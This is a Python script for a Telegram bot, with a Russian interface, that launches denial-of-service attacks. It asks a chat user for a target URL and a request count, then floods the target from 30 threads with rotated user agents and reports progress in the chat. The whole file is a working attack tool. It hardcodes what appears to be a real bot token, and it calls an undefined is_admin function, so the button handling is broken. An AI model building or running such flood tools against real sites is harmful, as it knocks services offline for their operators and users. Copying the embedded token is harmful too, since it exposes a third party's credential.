# -*- coding: utf-8 -*-
import requests
import threading
import time
import random
import sys

# ======================= КОНФИГУРАЦИЯ =======================
TOKEN = "8257424191:AAEj5QRCY-6jnQ58p6KT7LhkqzUosMnM8aI"
# ============================================================

# Хранилище данных
user_states = {}
active_attacks = {}
attack_lock = threading.Lock()
message_id_cache = {}





# ======================= ФУНКЦИИ ДЛЯ TELEGRAM =======================

def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML"
    }
    if reply_markup:
        data["reply_markup"] = reply_markup

    try:
        response = requests.post(url, json=data, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Send error: {e}")
        return None


def edit_message(chat_id, message_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
    data = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "HTML"
    }
    if reply_markup:
        data["reply_markup"] = reply_markup

    try:
        requests.post(url, json=data, timeout=10)
    except Exception as e:
        print(f"Edit error: {e}")


def answer_callback(callback_id, text, show_alert=False):
    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
    data = {
        "callback_query_id": callback_id,
        "text": text,
        "show_alert": show_alert
    }
    try:
        requests.post(url, json=data, timeout=10)
    except Exception as e:
        print(f"Answer error: {e}")


def delete_message(chat_id, message_id):
    url = f"https://api.telegram.org/bot{TOKEN}/deleteMessage"
    data = {
        "chat_id": chat_id,
        "message_id": message_id
    }
    try:
        requests.post(url, json=data, timeout=10)
    except:
        pass


# ======================= КЛАСС ДЛЯ КЛАВИАТУР =======================

class InlineKeyboardButton:
    def __init__(self, text, callback_data):
        self.text = text
        self.callback_data = callback_data


class InlineKeyboardMarkup:
    def __init__(self):
        self.buttons = []

    def add(self, *buttons):
        row = []
        for btn in buttons:
            row.append({"text": btn.text, "callback_data": btn.callback_data})
        self.buttons.append(row)

    def to_dict(self):
        return {"inline_keyboard": self.buttons}


# ======================= КЛАСС DDOS АТАКИ =======================

class DDoSAttack:
    def __init__(self, url, count, chat_id, message_id, attack_id):
        self.url = url
        self.count = count
        self.chat_id = chat_id
        self.message_id = message_id
        self.attack_id = attack_id
        self.is_running = True
        self.sent = 0
        self.success = 0
        self.error = 0
        self.start_time = time.time()
        self.threads = []
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        ]

        # Сохраняем в глобальном хранилище
        with attack_lock:
            active_attacks[attack_id] = self

    def worker(self):
        while self.is_running and self.sent < self.count:
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                r = requests.get(self.url, headers=headers, timeout=2)
                with attack_lock:
                    self.sent += 1
                    if r.status_code == 200:
                        self.success += 1
                    else:
                        self.error += 1
            except:
                with attack_lock:
                    self.sent += 1
                    self.error += 1

            # Обновляем статус каждые 50 запросов
            if self.sent % 50 == 0:
                self.update_status()

    def update_status(self):
        if not self.is_running:
            return

        elapsed = time.time() - self.start_time
        rate = self.sent / elapsed if elapsed > 0 else 0
        percent = int(self.sent / self.count * 100) if self.count > 0 else 0

        # Создаем клавиатуру с кнопкой СТОП
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🛑 ОСТАНОВИТЬ АТАКУ", f"stop_{self.attack_id}"))

        text = f"🔥 <b>DDoS АТАКА</b>\n\n"
        text += f"🎯 <b>Цель:</b> {self.url}\n"
        text += f"📊 <b>Прогресс:</b> {self.sent}/{self.count} ({percent}%)\n"
        text += f"⚡ <b>Скорость:</b> {rate:.1f}/сек\n"
        text += f"✅ <b>Успешно:</b> {self.success}\n"
        text += f"❌ <b>Ошибок:</b> {self.error}\n"
        text += f"⏱ <b>Время:</b> {int(elapsed)} сек\n"
        text += f"🆔 <b>ID:</b> {self.attack_id}"

        edit_message(self.chat_id, self.message_id, text, markup.to_dict())

    def run(self):
        # Запускаем потоки
        for i in range(30):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)

        # Ждем завершения или остановки
        while self.is_running and self.sent < self.count:
            time.sleep(0.1)

        # Останавливаем все потоки
        self.is_running = False

        # Финальное обновление
        elapsed = time.time() - self.start_time

        if self.sent >= self.count:
            text = f"✅ <b>АТАКА ЗАВЕРШЕНА</b>\n\n"
        else:
            text = f"🛑 <b>АТАКА ОСТАНОВЛЕНА</b>\n\n"

        text += f"🎯 <b>Цель:</b> {self.url}\n"
        text += f"📊 <b>Отправлено:</b> {self.sent}\n"
        text += f"✅ <b>Успешно:</b> {self.success}\n"
        text += f"❌ <b>Ошибок:</b> {self.error}\n"
        text += f"⏱ <b>Время:</b> {int(elapsed)} сек"

        edit_message(self.chat_id, self.message_id, text)

        # Удаляем из активных атак
        with attack_lock:
            if self.attack_id in active_attacks:
                del active_attacks[self.attack_id]

    def stop(self):
        self.is_running = False


# ======================= ОБРАБОТКА КОМАНД =======================

def process_updates():
    offset = 0
    print("🟢 Бот запущен, ожидание команд...")

    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
            params = {"offset": offset, "timeout": 30}
            response = requests.get(url, params=params, timeout=35)
            data = response.json()

            if "result" in data:
                for update in data["result"]:
                    offset = update["update_id"] + 1

                    # Обработка сообщений
                    if "message" in update:
                        msg = update["message"]
                        chat_id = msg["chat"]["id"]
                        user_id = msg["from"]["id"]



                        if "text" in msg:
                            text = msg["text"]

                            if text == "/start":
                                markup = InlineKeyboardMarkup()
                                markup.add(
                                    InlineKeyboardButton("⚡ НОВАЯ АТАКА", "new"),
                                    InlineKeyboardButton("📊 СТАТУС", "status"),
                                    InlineKeyboardButton("🛑 СТОП ВСЕ", "stop_all")
                                )
                                send_message(
                                    chat_id,
                                    "🔥 <b>DDoS БОТ</b>\n\n"
                                    "Выберите действие:",
                                    markup.to_dict()
                                )

                            elif text == "/ddos" or text == "⚡ НОВАЯ АТАКА":
                                send_message(chat_id, "🌐 Введите URL цели (например: https://example.com):")
                                user_states[user_id] = {"step": "waiting_url"}

                            elif user_id in user_states:
                                state = user_states[user_id]

                                if state["step"] == "waiting_url":
                                    url = text.strip()
                                    if not url.startswith(('http://', 'https://')):
                                        url = 'http://' + url
                                    state["url"] = url
                                    state["step"] = "waiting_count"
                                    send_message(chat_id, f"🎯 Цель: {url}\n\nВведите количество запросов (макс 5000):")

                                elif state["step"] == "waiting_count":
                                    try:
                                        count = int(text.strip())
                                        if count <= 0:
                                            send_message(chat_id, "❌ Число должно быть больше 0")
                                            continue
                                        if count > 5000:
                                            count = 5000

                                        attack_id = f"attack_{int(time.time())}"
                                        url = state["url"]
                                        del user_states[user_id]

                                        markup = InlineKeyboardMarkup()
                                        markup.add(
                                            InlineKeyboardButton("✅ ЗАПУСТИТЬ", f"start_{attack_id}|{url}|{count}"),
                                            InlineKeyboardButton("❌ ОТМЕНА", "cancel")
                                        )

                                        send_message(
                                            chat_id,
                                            f"⚠️ <b>ПОДТВЕРЖДЕНИЕ</b>\n\n"
                                            f"🎯 Цель: {url}\n"
                                            f"📊 Запросов: {count}\n\n"
                                            f"Запустить атаку?",
                                            markup.to_dict()
                                        )
                                    except ValueError:
                                        send_message(chat_id, "❌ Введите число")

                    # Обработка callback-запросов (кнопки)
                    elif "callback_query" in update:
                        cb = update["callback_query"]
                        cb_id = cb["id"]
                        chat_id = cb["message"]["chat"]["id"]
                        message_id = cb["message"]["message_id"]
                        user_id = cb["from"]["id"]
                        data = cb["data"]

                        print(f"Callback: {data} from user {user_id}")

                        if not is_admin(user_id):
                            answer_callback(cb_id, "❌ Доступ запрещен")
                            continue

                        # НОВАЯ АТАКА
                        if data == "new":
                            answer_callback(cb_id, "⚡ Создание новой атаки")
                            delete_message(chat_id, message_id)
                            send_message(chat_id, "🌐 Введите URL цели:")
                            user_states[user_id] = {"step": "waiting_url"}

                        # СТАТУС
                        elif data == "status":
                            with attack_lock:
                                if not active_attacks:
                                    answer_callback(cb_id, "📊 Нет активных атак")
                                    send_message(chat_id, "📊 Нет активных атак")
                                else:
                                    answer_callback(cb_id, f"📊 Активных атак: {len(active_attacks)}")
                                    text = "📊 <b>АКТИВНЫЕ АТАКИ</b>\n\n"
                                    for aid, attack in active_attacks.items():
                                        elapsed = time.time() - attack.start_time
                                        percent = int(attack.sent / attack.count * 100) if attack.count > 0 else 0
                                        text += f"🆔 <b>ID:</b> {aid}\n"
                                        text += f"🎯 <b>Цель:</b> {attack.url}\n"
                                        text += f"📊 <b>Прогресс:</b> {percent}% ({attack.sent}/{attack.count})\n"
                                        text += f"⏱ <b>Время:</b> {int(elapsed)} сек\n\n"
                                    send_message(chat_id, text)

                        # СТОП ВСЕ
                        elif data == "stop_all":
                            with attack_lock:
                                for attack in active_attacks.values():
                                    attack.stop()
                                active_attacks.clear()
                            answer_callback(cb_id, "✅ Все атаки остановлены", show_alert=True)
                            delete_message(chat_id, message_id)
                            send_message(chat_id, "✅ <b>Все атаки остановлены</b>")

                        # ОТМЕНА
                        elif data == "cancel":
                            answer_callback(cb_id, "❌ Отменено")
                            delete_message(chat_id, message_id)

                        # ЗАПУСК АТАКИ
                        elif data.startswith("start_"):
                            params = data.replace("start_", "").split('|')
                            if len(params) == 3:
                                attack_id = params[0]
                                url = params[1]
                                count = int(params[2])

                                # Отправляем сообщение о запуске
                                status_msg = send_message(
                                    chat_id,
                                    f"🚀 <b>ЗАПУСК АТАКИ</b>\n\n🎯 {url}\n📊 {count} запросов\n\n⏳ Подготовка..."
                                )

                                if status_msg and "result" in status_msg:
                                    msg_id = status_msg["result"]["message_id"]

                                    # Создаем и запускаем атаку
                                    attack = DDoSAttack(url, count, chat_id, msg_id, attack_id)

                                    thread = threading.Thread(target=attack.run)
                                    thread.daemon = True
                                    thread.start()

                                    answer_callback(cb_id, "✅ Атака запущена")
                                    delete_message(chat_id, message_id)
                                else:
                                    answer_callback(cb_id, "❌ Ошибка запуска")

                        # ОСТАНОВКА АТАКИ
                        elif data.startswith("stop_"):
                            attack_id = data.replace("stop_", "")
                            print(f"Попытка остановить атаку: {attack_id}")

                            with attack_lock:
                                if attack_id in active_attacks:
                                    attack = active_attacks[attack_id]
                                    attack.stop()
                                    # НЕ удаляем сразу, даем время на завершение
                                    answer_callback(cb_id, "🛑 Атака останавливается...")

                                    # Обновляем сообщение
                                    edit_message(
                                        chat_id,
                                        message_id,
                                        f"🛑 <b>ОСТАНОВКА АТАКИ</b>\n\n"
                                        f"🆔 ID: {attack_id}\n"
                                        f"🎯 Цель: {attack.url}\n\n"
                                        f"⏳ Ожидание завершения потоков..."
                                    )
                                else:
                                    answer_callback(cb_id, "❌ Атака не найдена")
                                    print(f"Атака {attack_id} не найдена в {list(active_attacks.keys())}")

        except KeyboardInterrupt:
            print("\n❌ Остановка бота...")
            # Останавливаем все атаки
            with attack_lock:
                for attack in active_attacks.values():
                    attack.stop()
            break

        except Exception as e:
            print(f"Ошибка в цикле: {e}")
            time.sleep(5)


# ======================= ЗАПУСК =======================

if __name__ == "__main__":
    print("=" * 60)
    print("🔥 DDoS БОТ - ИСПРАВЛЕННАЯ ВЕРСИЯ")
    print("=" * 60)
    print(f"✅ Токен: {TOKEN[:15]}...")
    print("=" * 60)
    print("\n🚀 Бот запускается...")
    print("📱 Напишите /start в Telegram")
    print("=" * 60)

    try:
        process_updates()
    except KeyboardInterrupt:
        print("\n❌ Бот остановлен")
    except Exception as e:
        print(f"\n❌ Ошибка: {e}")

    # Останавливаем все атаки при выходе
    with attack_lock:
        for attack in active_attacks.values():
            attack.stop()

    sys.exit(0)
